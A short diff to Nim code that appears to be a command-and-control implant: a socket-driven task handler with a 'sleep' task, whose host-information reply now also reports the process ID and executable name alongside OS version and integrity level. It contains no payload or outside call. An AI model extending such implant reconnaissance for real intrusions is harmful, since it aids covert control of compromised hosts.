@@ -36,7 +36,9 @@ proc handleTask(client: Socket, jsonNode: JsonNode) =
       osType=osType,
       windowsVersionInfo=getwindowosinfo(),
       linuxVersionInfo=getlinuxosinfo(),
-      ownIntegrity=getintegrity()
+      ownIntegrity=getintegrity(),
+      pid=getCurrentProcessId(),
+      pname=getAppFilename()
     )
   elif taskName == "sleep":
     sleepTime = parseInt(params[0])
